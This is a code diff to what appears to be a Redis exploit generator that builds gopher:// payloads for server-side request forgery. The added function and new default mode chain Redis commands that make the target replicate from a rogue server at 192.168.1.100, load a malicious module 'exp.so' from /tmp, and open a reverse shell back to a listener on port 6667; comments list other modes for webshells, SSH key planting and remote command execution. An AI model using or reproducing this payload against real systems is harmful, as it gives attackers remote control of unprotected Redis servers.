@@ -74,6 +74,25 @@ def generate_rce(lhost,lport,passwd,command="cat /etc/passwd"):
         cmd.insert(0,"AUTH {}".format(passwd))
     return cmd
 
+def generate_reverse_so(lhost,lport,revhost,revport,passwd):
+
+    exp_filename="exp.so"
+    cmd=[
+        "SLAVEOF {} {}".format(lhost,lport),
+        "CONFIG SET dir /tmp/",
+        "config set dbfilename {}".format(exp_filename),
+        "MODULE LOAD /tmp/{}".format(exp_filename),
+        "system.rev {} {}".format(revhost,revport),
+        # "SLAVEOF NO ONE",
+        # "CONFIG SET dbfilename dump.rdb",
+        # "system.exec rm${IFS}/tmp/{}".format(exp_filename),
+        # "MODULE UNLOAD system",
+        "quit"
+        ]
+    if passwd:
+        cmd.insert(0,"AUTH {}".format(passwd))
+    return cmd
+
 def rce_cleanup():
     exp_filename="exp.so"
     cmd=[
@@ -134,6 +153,14 @@ def generate_payload(passwd,mode):
 
     elif mode==4:
         cmd=generate_info(passwd)
+    
+    elif mode==5:
+        lhost="192.168.1.100" # rouge-server host
+        lport="6666" # rouge-server port
+        revhost="192.168.1.100" #host waiting for reverseshell
+        revport="6667" #port on host waiting for revshell
+        
+        cmd=generate_reverse_so(lhost,lport,revhost,revport,passwd)     
 
     protocol="gopher://"
 
@@ -146,15 +173,15 @@ def generate_payload(passwd,mode):
         payload += quote(redis_format(x).replace("^"," "))
     return payload
 
-    
 
 if __name__=="__main__":   
 
     # 0 for webshell ; 1 for re shell ; 2 for ssh key ; 
     # 3 for redis rce ; 31 for rce clean up
     # 4 for info
+    # 5 for revshell
     # suggest cleaning up when mode 3 used
-    mode=3
+    mode=5
 
     # input auth passwd or leave blank for no pw
     passwd = '' 
